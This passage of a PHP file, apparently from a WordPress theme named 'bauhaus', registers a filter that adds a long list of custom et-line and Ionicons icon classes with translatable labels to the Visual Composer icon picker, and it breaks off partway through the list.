<?php

/********new******************************/

add_filter( 'vc_iconpicker-type-fontawesome', 'bauhaus_tweak_vc_iconpicker_type_fontawesome2' );


function bauhaus_tweak_vc_iconpicker_type_fontawesome2( $icons ) {
	// Add custom icons to array
	$icons[esc_html__( 'bauhaus et line icons', 'bauhaus' )] = array(
		array( " icon-medium icon-apartment" => esc_html__( "apartment", "bauhaus" ) ),
		array( " icon-medium icon-paint-roller" => esc_html__( "paint roller", "bauhaus" ) ),
		array( " icon-pencil-ruler" => esc_html__( "pencil ruler", "bauhaus" ) ),
		array( " icon ion-alert" => esc_html__( "alert", "bauhaus" ) ),
		array( " icon ion-alert-circled" => esc_html__( "alert circled", "bauhaus" ) ),
		array( " icon ion-android-add" => esc_html__( "android add", "bauhaus" ) ),
		array( " icon ion-android-add-circle" => esc_html__( "android add circle", "bauhaus" ) ),
		array( " icon ion-android-alarm-clock" => esc_html__( "android alarm clock", "bauhaus" ) ),
		array( " icon ion-android-alert" => esc_html__( "android alert", "bauhaus" ) ),
		array( " icon ion-android-apps" => esc_html__( "android apps", "bauhaus" ) ),
		array( " icon ion-android-archive" => esc_html__( "android archive", "bauhaus" ) ),
		array( " icon ion-android-arrow-back" => esc_html__( "android arrow back", "bauhaus" ) ),
		array( " icon ion-android-arrow-down" => esc_html__( "android arrow down", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropdown" => esc_html__( "android arrow dropdown", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropdown-circle" => esc_html__( "android arrow dropdown circle", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropleft" => esc_html__( "android arrow dropleft", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropleft-circle" => esc_html__( "android arrow dropleft circle", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropright" => esc_html__( "android arrow dropright", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropright-circle" => esc_html__( "android arrow dropright circle", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropup" => esc_html__( "android arrow dropup", "bauhaus" ) ),
		array( " icon ion-android-arrow-dropup-circle" => esc_html__( "android arrow dropup circle", "bauhaus" ) ),
		array( " icon ion-android-arrow-forward" => esc_html__( "android arrow forward", "bauhaus" ) ),
		array( " icon ion-android-arrow-up" => esc_html__( "android arrow up", "bauhaus" ) ),
		array( " icon ion-android-attach" => esc_html__( "android attach", "bauhaus" ) ),
		array( " icon ion-android-bar" => esc_html__( "android bar", "bauhaus" ) ),
		array( " icon ion-android-bicycle" => esc_html__( "android bicycle", "bauhaus" ) ),
		array( " icon ion-android-boat" => esc_html__( "android boat", "bauhaus" ) ),
		array( " icon ion-android-bookmark" => esc_html__( "android bookmark", "bauhaus" ) ),
		array( " icon ion-android-bulb" => esc_html__( "android bulb", "bauhaus" ) ),
		array( " icon ion-android-bus" => esc_html__( "android bus", "bauhaus" ) ),
		array( " icon ion-android-calendar" => esc_html__( "android calendar", "bauhaus" ) ),
		array( " icon ion-android-call" => esc_html__( "android call", "bauhaus" ) ),
		array( " icon ion-android-camera" => esc_html__( "android camera", "bauhaus" ) ),
		array( " icon ion-android-cancel" => esc_html__( "android cancel", "bauhaus" ) ),
		array( " icon ion-android-car" => esc_html__( "android car", "bauhaus" ) ),
		array( " icon ion-android-cart" => esc_html__( "android cart", "bauhaus" ) ),
		array( " icon ion-android-chat" => esc_html__( "android chat", "bauhaus" ) ),
		array( " icon ion-android-checkbox" => esc_html__( "android checkbox", "bauhaus" ) ),
		array( " icon ion-android-checkbox-blank" => esc_html__( "android checkbox blank", "bauhaus" ) ),
		array( " icon ion-android-checkbox-outline" => esc_html__( "android checkbox outline", "bauhaus" ) ),
		array( " icon ion-android-checkbox-outline-blank" => esc_html__( "android checkbox outline blank", "bauhaus" ) ),
		array( " icon ion-android-checkmark-circle" => esc_html__( "android checkmark circle", "bauhaus" ) ),
		array( " icon ion-android-clipboard" => esc_html__( "android clipboard", "bauhaus" ) ),
		array( " icon ion-android-close" => esc_html__( "android close", "bauhaus" ) ),
		array( " icon ion-android-cloud" => esc_html__( "android cloud", "bauhaus" ) ),
		array( " icon ion-android-cloud-circle" => esc_html__( "android cloud circle", "bauhaus" ) ),
		array( " icon ion-android-cloud-done" => esc_html__( "android cloud done", "bauhaus" ) ),
		array( " icon ion-android-cloud-outline" => esc_html__( "android cloud outline", "bauhaus" ) ),
		array( " icon ion-android-color-palette" => esc_html__( "android color palette", "bauhaus" ) ),
		array( " icon ion-android-compass" => esc_html__( "android compass", "bauhaus" ) ),
		array( " icon ion-android-contact" => esc_html__( "android contact", "bauhaus" ) ),
		array( " icon ion-android-contacts" => esc_html__( "android contacts", "bauhaus" ) ),
		array( " icon ion-android-contract" => esc_html__( "android contract", "bauhaus" ) ),
		array( " icon ion-android-create" => esc_html__( "android create", "bauhaus" ) ),
		array( " icon ion-android-delete" => esc_html__( "android delete", "bauhaus" ) ),
		array( " icon ion-android-desktop" => esc_html__( "android desktop", "bauhaus" ) ),
		array( " icon ion-android-document" => esc_html__( "android document", "bauhaus" ) ),
		array( " icon ion-android-done" => esc_html__( "android done", "bauhaus" ) ),
		array( " icon ion-android-done-all" => esc_html__( "android done all", "bauhaus" ) ),
		array( " icon ion-android-download" => esc_html__( "android download", "bauhaus" ) ),
		array( " icon ion-android-drafts" => esc_html__( "android drafts", "bauhaus" ) ),
		array( " icon ion-android-exit" => esc_html__( "android exit", "bauhaus" ) ),
		array( " icon ion-android-expand" => esc_html__( "android expand", "bauhaus" ) ),
		array( " icon ion-android-favorite" => esc_html__( "android favorite", "bauhaus" ) ),
		array( " icon ion-android-favorite-outline" => esc_html__( "android favorite outline", "bauhaus" ) ),
		array( " icon ion-android-film" => esc_html__( "android film", "bauhaus" ) ),
		array( " icon ion-android-folder" => esc_html__( "android folder", "bauhaus" ) ),
		array( " icon ion-android-folder-open" => esc_html__( "android folder open", "bauhaus" ) ),
		array( " icon ion-android-funnel" => esc_html__( "android funnel", "bauhaus" ) ),
		array( " icon ion-android-globe" => esc_html__( "android globe", "bauhaus" ) ),
		array( " icon ion-android-hand" => esc_html__( "android hand", "bauhaus" ) ),
		array( " icon ion-android-hangout" => esc_html__( "android hangout", "bauhaus" ) ),
		array( " icon ion-android-happy" => esc_html__( "android happy", "bauhaus" ) ),
		array( " icon ion-android-home" => esc_html__( "android home", "bauhaus" ) ),
		array( " icon ion-android-image" => esc_html__( "android image", "bauhaus" ) ),
		array( " icon ion-android-laptop" => esc_html__( "android laptop", "bauhaus" ) ),
		array( " icon ion-android-list" => esc_html__( "android list", "bauhaus" ) ),
		array( " icon ion-android-locate" => esc_html__( "android locate", "bauhaus" ) ),
		array( " icon ion-android-lock" => esc_html__( "android lock", "bauhaus" ) ),
		array( " icon ion-android-mail" => esc_html__( "android mail", "bauhaus" ) ),
		array( " icon ion-android-map" => esc_html__( "android map", "bauhaus" ) ),
		array( " icon ion-android-menu" => esc_html__( "android menu", "bauhaus" ) ),
		array( " icon ion-android-microphone" => esc_html__( "android microphone", "bauhaus" ) ),
		array( " icon ion-android-microphone-off" => esc_html__( "android microphone off", "bauhaus" ) ),
		array( " icon ion-android-more-horizontal" => esc_html__( "android more horizontal", "bauhaus" ) ),
		array( " icon ion-android-more-vertical" => esc_html__( "android more vertical", "bauhaus" ) ),
		array( " icon ion-android-navigate" => esc_html__( "android navigate", "bauhaus" ) ),
		array( " icon ion-android-notifications" => esc_html__( "android notifications", "bauhaus" ) ),
		array( " icon ion-android-notifications-none" => esc_html__( "android notifications none", "bauhaus" ) ),
		array( " icon ion-android-notifications-off" => esc_html__( "android notifications off", "bauhaus" ) ),
		array( " icon ion-android-open" => esc_html__( "android open", "bauhaus" ) ),
		array( " icon ion-android-options" => esc_html__( "android options", "bauhaus" ) ),
		array( " icon ion-android-people" => esc_html__( "android people", "bauhaus" ) ),
		array( " icon ion-android-person" => esc_html__( "android person", "bauhaus" ) ),
		array( " icon ion-android-person-add" => esc_html__( "android person add", "bauhaus" ) ),
		array( " icon ion-android-phone-landscape" => esc_html__( "android phone landscape", "bauhaus" ) ),
		array( " icon ion-android-phone-portrait" => esc_html__( "android phone portrait", "bauhaus" ) ),
		array( " icon ion-android-pin" => esc_html__( "android pin", "bauhaus" ) ),
		array( " icon ion-android-plane" => esc_html__( "android plane", "bauhaus" ) ),
		array( " icon ion-android-playstore" => esc_html__( "android playstore", "bauhaus" ) ),
		array( " icon ion-android-print" => esc_html__( "android print", "bauhaus" ) ),
		array( " icon ion-android-radio-button-off" => esc_html__( "android radio button off", "bauhaus" ) ),
		array( " icon ion-android-radio-button-on" => esc_html__( "android radio button on", "bauhaus" ) ),
		array( " icon ion-android-refresh" => esc_html__( "android refresh", "bauhaus" ) ),
		array( " icon ion-android-remove" => esc_html__( "android remove", "bauhaus" ) ),
		array( " icon ion-android-remove-circle" => esc_html__( "android remove circle", "bauhaus" ) ),
		array( " icon ion-android-restaurant" => esc_html__( "android restaurant", "bauhaus" ) ),
		array( " icon ion-android-sad" => esc_html__( "android sad", "bauhaus" ) ),
		array( " icon ion-android-search" => esc_html__( "android search", "bauhaus" ) ),
		array( " icon ion-android-send" => esc_html__( "android send", "bauhaus" ) ),
		array( " icon ion-android-settings" => esc_html__( "android settings", "bauhaus" ) ),
		array( " icon ion-android-share" => esc_html__( "android share", "bauhaus" ) ),
		array( " icon ion-android-share-alt" => esc_html__( "android share alt", "bauhaus" ) ),
		array( " icon ion-android-star" => esc_html__( "android star", "bauhaus" ) ),
		array( " icon ion-android-star-half" => esc_html__( "android star half", "bauhaus" ) ),
		array( " icon ion-android-star-outline" => esc_html__( "android star outline", "bauhaus" ) ),
		array( " icon ion-android-stopwatch" => esc_html__( "android stopwatch", "bauhaus" ) ),
		array( " icon ion-android-subway" => esc_html__( "android subway", "bauhaus" ) ),
		array( " icon ion-android-sunny" => esc_html__( "android sunny", "bauhaus" ) ),
		array( " icon ion-android-sync" => esc_html__( "android sync", "bauhaus" ) ),
		array( " icon ion-android-textsms" => esc_html__( "android textsms", "bauhaus" ) ),
		array( " icon ion-android-time" => esc_html__( "android time", "bauhaus" ) ),
		array( " icon ion-android-train" => esc_html__( "android train", "bauhaus" ) ),
		array( " icon ion-android-unlock" => esc_html__( "android unlock", "bauhaus" ) ),
		array( " icon ion-android-upload" => esc_html__( "android upload", "bauhaus" ) ),
		array( " icon ion-android-volume-down" => esc_html__( "android volume down", "bauhaus" ) ),
		array( " icon ion-android-volume-mute" => esc_html__( "android volume mute", "bauhaus" ) ),
		array( " icon ion-android-volume-off" => esc_html__( "android volume off", "bauhaus" ) ),
		array( " icon ion-android-volume-up" => esc_html__( "android volume up", "bauhaus" ) ),
		array( " icon ion-android-walk" => esc_html__( "android walk", "bauhaus" ) ),
		array( " icon ion-android-warning" => esc_html__( "android warning", "bauhaus" ) ),
		array( " icon ion-android-watch" => esc_html__( "android watch", "bauhaus" ) ),
		array( " icon ion-android-wifi" => esc_html__( "android wifi", "bauhaus" ) ),
		array( " icon ion-aperture" => esc_html__( "aperture", "bauhaus" ) ),
		array( " icon ion-archive" => esc_html__( "archive", "bauhaus" ) ),
		array( " icon ion-arrow-down-a" => esc_html__( "arrow down a", "bauhaus" ) ),
		array( " icon ion-arrow-down-b" => esc_html__( "arrow down b", "bauhaus" ) ),
		array( " icon ion-arrow-down-c" => esc_html__( "arrow down c", "bauhaus" ) ),
		array( " icon ion-arrow-expand" => esc_html__( "arrow expand", "bauhaus" ) ),
		array( " icon ion-arrow-graph-down-left" => esc_html__( "arrow graph down left", "bauhaus" ) ),
		array( " icon ion-arrow-graph-down-right" => esc_html__( "arrow graph down right", "bauhaus" ) ),
		array( " icon ion-arrow-graph-up-left" => esc_html__( "arrow graph up left", "bauhaus" ) ),
		array( " icon ion-arrow-graph-up-right" => esc_html__( "arrow graph up right", "bauhaus" ) ),
		array( " icon ion-arrow-left-a" => esc_html__( "arrow left a", "bauhaus" ) ),
		array( " icon ion-arrow-left-b" => esc_html__( "arrow left b", "bauhaus" ) ),
		array( " icon ion-arrow-left-c" => esc_html__( "arrow left c", "bauhaus" ) ),
		array( " icon ion-arrow-move" => esc_html__( "arrow move", "bauhaus" ) ),
		array( " icon ion-arrow-resize" => esc_html__( "arrow resize", "bauhaus" ) ),
		array( " icon ion-arrow-return-left" => esc_html__( "arrow return left", "bauhaus" ) ),
		array( " icon ion-arrow-return-right" => esc_html__( "arrow return right", "bauhaus" ) ),
		array( " icon ion-arrow-right-a" => esc_html__( "arrow right a", "bauhaus" ) ),
		array( " icon ion-arrow-right-b" => esc_html__( "arrow right b", "bauhaus" ) ),
		array( " icon ion-arrow-right-c" => esc_html__( "arrow right c", "bauhaus" ) ),
		array( " icon ion-arrow-shrink" => esc_html__( "arrow shrink", "bauhaus" ) ),
		array( " icon ion-arrow-swap" => esc_html__( "arrow swap", "bauhaus" ) ),
		array( " icon ion-arrow-up-a" => esc_html__( "arrow up a", "bauhaus" ) ),
		array( " icon ion-arrow-up-b" => esc_html__( "arrow up b", "bauhaus" ) ),
		array( " icon ion-arrow-up-c" => esc_html__( "arrow up c", "bauhaus" ) ),
		array( " icon ion-asterisk" => esc_html__( "asterisk", "bauhaus" ) ),
		array( " icon ion-at" => esc_html__( "at", "bauhaus" ) ),
		array( " icon ion-backspace" => esc_html__( "backspace", "bauhaus" ) ),
		array( " icon ion-backspace-outline" => esc_html__( "backspace outline", "bauhaus" ) ),
		array( " icon ion-bag" => esc_html__( "bag", "bauhaus" ) ),
		array( " icon ion-battery-charging" => esc_html__( "battery charging", "bauhaus" ) ),
		array( " icon ion-battery-empty" => esc_html__( "battery empty", "bauhaus" ) ),
		array( " icon ion-battery-full" => esc_html__( "battery full", "bauhaus" ) ),
		array( " icon ion-battery-half" => esc_html__( "battery half", "bauhaus" ) ),
		array( " icon ion-battery-low" => esc_html__( "battery low", "bauhaus" ) ),
		array( " icon ion-beaker" => esc_html__( "beaker", "bauhaus" ) ),
		array( " icon ion-beer" => esc_html__( "beer", "bauhaus" ) ),
		array( " icon ion-bluetooth" => esc_html__( "bluetooth", "bauhaus" ) ),
		array( " icon ion-bonfire" => esc_html__( "bonfire", "bauhaus" ) ),
		array( " icon ion-bookmark" => esc_html__( "bookmark", "bauhaus" ) ),
		array( " icon ion-bowtie" => esc_html__( "bowtie", "bauhaus" ) ),
		array( " icon ion-briefcase" => esc_html__( "briefcase", "bauhaus" ) ),
		array( " icon ion-bug" => esc_html__( "bug", "bauhaus" ) ),
		array( " icon ion-calculator" => esc_html__( "calculator", "bauhaus" ) ),
		array( " icon ion-calendar" => esc_html__( "calendar", "bauhaus" ) ),
		array( " icon ion-camera" => esc_html__( "camera", "bauhaus" ) ),
		array( " icon ion-card" => esc_html__( "card", "bauhaus" ) ),
		array( " icon ion-cash" => esc_html__( "cash", "bauhaus" ) ),
		array( " icon ion-chatbox" => esc_html__( "chatbox", "bauhaus" ) ),
		array( " icon ion-chatbox-working" => esc_html__( "chatbox working", "bauhaus" ) ),
		array( " icon ion-chatboxes" => esc_html__( "chatboxes", "bauhaus" ) ),
		array( " icon ion-chatbubble" => esc_html__( "chatbubble", "bauhaus" ) ),
		array( " icon ion-chatbubble-working" => esc_html__( "chatbubble working", "bauhaus" ) ),
		array( " icon ion-chatbubbles" => esc_html__( "chatbubbles", "bauhaus" ) ),
		array( " icon ion-checkmark" => esc_html__( "checkmark", "bauhaus" ) ),
		array( " icon ion-checkmark-circled" => esc_html__( "checkmark circled", "bauhaus" ) ),
		array( " icon ion-checkmark-round" => esc_html__( "checkmark round", "bauhaus" ) ),
		array( " icon ion-chevron-down" => esc_html__( "chevron down", "bauhaus" ) ),
		array( " icon ion-chevron-left" => esc_html__( "chevron left", "bauhaus" ) ),
		array( " icon ion-chevron-right" => esc_html__( "chevron right", "bauhaus" ) ),
		array( " icon ion-chevron-up" => esc_html__( "chevron up", "bauhaus" ) ),
		array( " icon ion-clipboard" => esc_html__( "clipboard", "bauhaus" ) ),
		array( " icon ion-clock" => esc_html__( "clock", "bauhaus" ) ),
		array( " icon ion-close" => esc_html__( "close", "bauhaus" ) ),
		array( " icon ion-close-circled" => esc_html__( "close circled", "bauhaus" ) ),
		array( " icon ion-close-round" => esc_html__( "close round", "bauhaus" ) ),
		array( " icon ion-closed-captioning" => esc_html__( "closed captioning", "bauhaus" ) ),
		array( " icon ion-cloud" => esc_html__( "cloud", "bauhaus" ) ),
		array( " icon ion-code" => esc_html__( "code", "bauhaus" ) ),
		array( " icon ion-code-download" => esc_html__( "code download", "bauhaus" ) ),
		array( " icon ion-code-working" => esc_html__( "code working", "bauhaus" ) ),
		array( " icon ion-coffee" => esc_html__( "coffee", "bauhaus" ) ),
		array( " icon ion-compass" => esc_html__( "compass", "bauhaus" ) ),
		array( " icon ion-compose" => esc_html__( "compose", "bauhaus" ) ),
		array( " icon ion-connection-bars" => esc_html__( "connection bars", "bauhaus" ) ),
		array( " icon ion-contrast" => esc_html__( "contrast", "bauhaus" ) ),
		array( " icon ion-crop" => esc_html__( "crop", "bauhaus" ) ),
		array( " icon ion-cube" => esc_html__( "cube", "bauhaus" ) ),
		array( " icon ion-disc" => esc_html__( "disc", "bauhaus" ) ),
		array( " icon ion-document" => esc_html__( "document", "bauhaus" ) ),
		array( " icon ion-document-text" => esc_html__( "document text", "bauhaus" ) ),
		array( " icon ion-drag" => esc_html__( "drag", "bauhaus" ) ),
		array( " icon ion-earth" => esc_html__( "earth", "bauhaus" ) ),
		array( " icon ion-easel" => esc_html__( "easel", "bauhaus" ) ),
		array( " icon ion-edit" => esc_html__( "edit", "bauhaus" ) ),
		array( " icon ion-egg" => esc_html__( "egg", "bauhaus" ) ),
		array( " icon ion-eject" => esc_html__( "eject", "bauhaus" ) ),
		array( " icon ion-email" => esc_html__( "email", "bauhaus" ) ),
		array( " icon ion-email-unread" => esc_html__( "email unread", "bauhaus" ) ),
		array( " icon ion-erlenmeyer-flask" => esc_html__( "erlenmeyer flask", "bauhaus" ) ),
		array( " icon ion-erlenmeyer-flask-bubbles" => esc_html__( "erlenmeyer flask bubbles", "bauhaus" ) ),
		array( " icon ion-eye" => esc_html__( "eye", "bauhaus" ) ),
		array( " icon ion-eye-disabled" => esc_html__( "eye disabled", "bauhaus" ) ),
		array( " icon ion-female" => esc_html__( "female", "bauhaus" ) ),
		array( " icon ion-filing" => esc_html__( "filing", "bauhaus" ) ),
		array( " icon ion-film-marker" => esc_html__( "film marker", "bauhaus" ) ),
		array( " icon ion-fireball" => esc_html__( "fireball", "bauhaus" ) ),
		array( " icon ion-flag" => esc_html__( "flag", "bauhaus" ) ),
		array( " icon ion-flame" => esc_html__( "flame", "bauhaus" ) ),
		array( " icon ion-flash" => esc_html__( "flash", "bauhaus" ) ),
		array( " icon ion-flash-off" => esc_html__( "flash off", "bauhaus" ) ),
		array( " icon ion-folder" => esc_html__( "folder", "bauhaus" ) ),
		array( " icon ion-fork" => esc_html__( "fork", "bauhaus" ) ),
		array( " icon ion-fork-repo" => esc_html__( "fork repo", "bauhaus" ) ),
		array( " icon ion-forward" => esc_html__( "forward", "bauhaus" ) ),
		array( " icon ion-funnel" => esc_html__( "funnel", "bauhaus" ) ),
		array( " icon ion-gear-a" => esc_html__( "gear a", "bauhaus" ) ),
		array( " icon ion-gear-b" => esc_html__( "gear b", "bauhaus" ) ),
		array( " icon ion-grid" => esc_html__( "grid", "bauhaus" ) ),
		array( " icon ion-hammer" => esc_html__( "hammer", "bauhaus" ) ),
		array( " icon ion-happy" => esc_html__( "happy", "bauhaus" ) ),
		array( " icon ion-happy-outline" => esc_html__( "happy outline", "bauhaus" ) ),
		array( " icon ion-headphone" => esc_html__( "headphone", "bauhaus" ) ),
		array( " icon ion-heart" => esc_html__( "heart", "bauhaus" ) ),
		array( " icon ion-heart-broken" => esc_html__( "heart broken", "bauhaus" ) ),
		array( " icon ion-help" => esc_html__( "help", "bauhaus" ) ),
		array( " icon ion-help-buoy" => esc_html__( "help buoy", "bauhaus" ) ),
		array( " icon ion-help-circled" => esc_html__( "help circled", "bauhaus" ) ),
		array( " icon ion-home" => esc_html__( "home", "bauhaus" ) ),
		array( " icon ion-icecream" => esc_html__( "icecream", "bauhaus" ) ),
		array( " icon ion-image" => esc_html__( "image", "bauhaus" ) ),
		array( " icon ion-images" => esc_html__( "images", "bauhaus" ) ),
		array( " icon ion-information" => esc_html__( "information", "bauhaus" ) ),
		array( " icon ion-information-circled" => esc_html__( "information circled", "bauhaus" ) ),
		array( " icon ion-ionic" => esc_html__( "ionic", "bauhaus" ) ),
		array( " icon ion-ios-alarm" => esc_html__( "ios alarm", "bauhaus" ) ),
		array( " icon ion-ios-alarm-outline" => esc_html__( "ios alarm outline", "bauhaus" ) ),
		array( " icon ion-ios-albums" => esc_html__( "ios albums", "bauhaus" ) ),
		array( " icon ion-ios-albums-outline" => esc_html__( "ios albums outline", "bauhaus" ) ),
		array( " icon ion-ios-americanfootball" => esc_html__( "ios americanfootball", "bauhaus" ) ),
		array( " icon ion-ios-americanfootball-outline" => esc_html__( "ios americanfootball outline", "bauhaus" ) ),
		array( " icon ion-ios-analytics" => esc_html__( "ios analytics", "bauhaus" ) ),
		array( " icon ion-ios-analytics-outline" => esc_html__( "ios analytics outline", "bauhaus" ) ),
		array( " icon ion-ios-arrow-back" => esc_html__( "ios arrow back", "bauhaus" ) ),
		array( " icon ion-ios-arrow-down" => esc_html__( "ios arrow down", "bauhaus" ) ),
		array( " icon ion-ios-arrow-forward" => esc_html__( "ios arrow forward", "bauhaus" ) ),
		array( " icon ion-ios-arrow-left" => esc_html__( "ios arrow left", "bauhaus" ) ),
		array( " icon ion-ios-arrow-right" => esc_html__( "ios arrow right", "bauhaus" ) ),
		array( " icon ion-ios-arrow-thin-down" => esc_html__( "ios arrow thin down", "bauhaus" ) ),
		array( " icon ion-ios-arrow-thin-left" => esc_html__( "ios arrow thin left", "bauhaus" ) ),
		array( " icon ion-ios-arrow-thin-right" => esc_html__( "ios arrow thin right", "bauhaus" ) ),
		array( " icon ion-ios-arrow-thin-up" => esc_html__( "ios arrow thin up", "bauhaus" ) ),
		array( " icon ion-ios-arrow-up" => esc_html__( "ios arrow up", "bauhaus" ) ),
		array( " icon ion-ios-at" => esc_html__( "ios at", "bauhaus" ) ),
		array( " icon ion-ios-at-outline" => esc_html__( "ios at outline", "bauhaus" ) ),
		array( " icon ion-ios-barcode" => esc_html__( "ios barcode", "bauhaus" ) ),
		array( " icon ion-ios-barcode-outline" => esc_html__( "ios barcode outline", "bauhaus" ) ),
		array( " icon ion-ios-baseball" => esc_html__( "ios baseball", "bauhaus" ) ),
		array( " icon ion-ios-baseball-outline" => esc_html__( "ios baseball outline", "bauhaus" ) ),
		array( " icon ion-ios-basketball" => esc_html__( "ios basketball", "bauhaus" ) ),
		array( " icon ion-ios-basketball-outline" => esc_html__( "ios basketball outline", "bauhaus" ) ),
		array( " icon ion-ios-bell" => esc_html__( "ios bell", "bauhaus" ) ),
		array( " icon ion-ios-bell-outline" => esc_html__( "ios bell outline", "bauhaus" ) ),
		array( " icon ion-ios-body" => esc_html__( "ios body", "bauhaus" ) ),
		array( " icon ion-ios-body-outline" => esc_html__( "ios body outline", "bauhaus" ) ),
		array( " icon ion-ios-bolt" => esc_html__( "ios bolt", "bauhaus" ) ),
		array( " icon ion-ios-bolt-outline" => esc_html__( "ios bolt outline", "bauhaus" ) ),
		array( " icon ion-ios-book" => esc_html__( "ios book", "bauhaus" ) ),
		array( " icon ion-ios-book-outline" => esc_html__( "ios book outline", "bauhaus" ) ),
		array( " icon ion-ios-bookmarks" => esc_html__( "ios bookmarks", "bauhaus" ) ),
		array( " icon ion-ios-bookmarks-outline" => esc_html__( "ios bookmarks outline", "bauhaus" ) ),
		array( " icon ion-ios-box" => esc_html__( "ios box", "bauhaus" ) ),
		array( " icon ion-ios-box-outline" => esc_html__( "ios box outline", "bauhaus" ) ),
		array( " icon ion-ios-briefcase" => esc_html__( "ios briefcase", "bauhaus" ) ),
		array( " icon ion-ios-briefcase-outline" => esc_html__( "ios briefcase outline", "bauhaus" ) ),
		array( " icon ion-ios-browsers" => esc_html__( "ios browsers", "bauhaus" ) ),
		array( " icon ion-ios-browsers-outline" => esc_html__( "ios browsers outline", "bauhaus" ) ),
		array( " icon ion-ios-calculator" => esc_html__( "ios calculator", "bauhaus" ) ),
		array( " icon ion-ios-calculator-outline" => esc_html__( "ios calculator outline", "bauhaus" ) ),
		array( " icon ion-ios-calendar" => esc_html__( "ios calendar", "bauhaus" ) ),
		array( " icon ion-ios-calendar-outline" => esc_html__( "ios calendar outline", "bauhaus" ) ),
		array( " icon ion-ios-camera" => esc_html__( "ios camera", "bauhaus" ) ),
		array( " icon ion-ios-camera-outline" => esc_html__( "ios camera outline", "bauhaus" ) ),
		array( " icon ion-ios-cart" => esc_html__( "ios cart", "bauhaus" ) ),
		array( " icon ion-ios-cart-outline" => esc_html__( "ios cart outline", "bauhaus" ) ),
		array( " icon ion-ios-chatboxes" => esc_html__( "ios chatboxes", "bauhaus" ) ),
		array( " icon ion-ios-chatboxes-outline" => esc_html__( "ios chatboxes outline", "bauhaus" ) ),
		array( " icon ion-ios-chatbubble" => esc_html__( "ios chatbubble", "bauhaus" ) ),
		array( " icon ion-ios-chatbubble-outline" => esc_html__( "ios chatbubble outline", "bauhaus" ) ),
		array( " icon ion-ios-checkmark" => esc_html__( "ios checkmark", "bauhaus" ) ),
		array( " icon ion-ios-checkmark-empty" => esc_html__( "ios checkmark empty", "bauhaus" ) ),
		array( " icon ion-ios-checkmark-outline" => esc_html__( "ios checkmark outline", "bauhaus" ) ),
		array( " icon ion-ios-circle-filled" => esc_html__( "ios circle filled", "bauhaus" ) ),
		array( " icon ion-ios-circle-outline" => esc_html__( "ios circle outline", "bauhaus" ) ),
		array( " icon ion-ios-clock" => esc_html__( "ios clock", "bauhaus" ) ),
		array( " icon ion-ios-clock-outline" => esc_html__( "ios clock outline", "bauhaus" ) ),
		array( " icon ion-ios-close" => esc_html__( "ios close", "bauhaus" ) ),
		array( " icon ion-ios-close-empty" => esc_html__( "ios close empty", "bauhaus" ) ),
		array( " icon ion-ios-close-outline" => esc_html__( "ios close outline", "bauhaus" ) ),
		array( " icon ion-ios-cloud" => esc_html__( "ios cloud", "bauhaus" ) ),
		array( " icon ion-ios-cloud-download" => esc_html__( "ios cloud download", "bauhaus" ) ),
		array( " icon ion-ios-cloud-download-outline" => esc_html__( "ios cloud download outline", "bauhaus" ) ),
		array( " icon ion-ios-cloud-outline" => esc_html__( "ios cloud outline", "bauhaus" ) ),
		array( " icon ion-ios-cloud-upload" => esc_html__( "ios cloud upload", "bauhaus" ) ),
		array( " icon ion-ios-cloud-upload-outline" => esc_html__( "ios cloud upload outline", "bauhaus" ) ),
		array( " icon ion-ios-cloudy" => esc_html__( "ios cloudy", "bauhaus" ) ),
		array( " icon ion-ios-cloudy-night" => esc_html__( "ios cloudy night", "bauhaus" ) ),
		array( " icon ion-ios-cloudy-night-outline" => esc_html__( "ios cloudy night outline", "bauhaus" ) ),
		array( " icon ion-ios-cloudy-outline" => esc_html__( "ios cloudy outline", "bauhaus" ) ),
		array( " icon ion-ios-cog" => esc_html__( "ios cog", "bauhaus" ) ),
		array( " icon ion-ios-cog-outline" => esc_html__( "ios cog outline", "bauhaus" ) ),
		array( " icon ion-ios-color-filter" => esc_html__( "ios color filter", "bauhaus" ) ),
		array( " icon ion-ios-color-filter-outline" => esc_html__( "ios color filter outline", "bauhaus" ) ),
		array( " icon ion-ios-color-wand" => esc_html__( "ios color wand", "bauhaus" ) ),
		array( " icon ion-ios-color-wand-outline" => esc_html__( "ios color wand outline", "bauhaus" ) ),
		array( " icon ion-ios-compose" => esc_html__( "ios compose", "bauhaus" ) ),
		array( " icon ion-ios-compose-outline" => esc_html__( "ios compose outline", "bauhaus" ) ),
		array( " icon ion-ios-contact" => esc_html__( "ios contact", "bauhaus" ) ),
		array( " icon ion-ios-contact-outline" => esc_html__( "ios contact outline", "bauhaus" ) ),
		array( " icon ion-ios-copy" => esc_html__( "ios copy", "bauhaus" ) ),
		array( " icon ion-ios-copy-outline" => esc_html__( "ios copy outline", "bauhaus" ) ),
		array( " icon ion-ios-crop" => esc_html__( "ios crop", "bauhaus" ) ),
		array( " icon ion-ios-crop-strong" => esc_html__( "ios crop strong", "bauhaus" ) ),
		array( " icon ion-ios-download" => esc_html__( "ios download", "bauhaus" ) ),
		array( " icon ion-ios-download-outline" => esc_html__( "ios download outline", "bauhaus" ) ),
		array( " icon ion-ios-drag" => esc_html__( "ios drag", "bauhaus" ) ),
		array( " icon ion-ios-email" => esc_html__( "ios email", "bauhaus" ) ),
		array( " icon ion-ios-email-outline" => esc_html__( "ios email outline", "bauhaus" ) ),
		array( " icon ion-ios-eye" => esc_html__( "ios eye", "bauhaus" ) ),
		array( " icon ion-ios-eye-outline" => esc_html__( "ios eye outline", "bauhaus" ) ),
		array( " icon ion-ios-fastforward" => esc_html__( "ios fastforward", "bauhaus" ) ),
		array( " icon ion-ios-fastforward-outline" => esc_html__( "ios fastforward outline", "bauhaus" ) ),
		array( " icon ion-ios-filing" => esc_html__( "ios filing", "bauhaus" ) ),
		array( " icon ion-ios-filing-outline" => esc_html__( "ios filing outline", "bauhaus" ) ),
		array( " icon ion-ios-film" => esc_html__( "ios film", "bauhaus" ) ),
		array( " icon ion-ios-film-outline" => esc_html__( "ios film outline", "bauhaus" ) ),
		array( " icon ion-ios-flag" => esc_html__( "ios flag", "bauhaus" ) ),
		array( " icon ion-ios-flag-outline" => esc_html__( "ios flag outline", "bauhaus" ) ),
		array( " icon ion-ios-flame" => esc_html__( "ios flame", "bauhaus" ) ),
		array( " icon ion-ios-flame-outline" => esc_html__( "ios flame outline", "bauhaus" ) ),
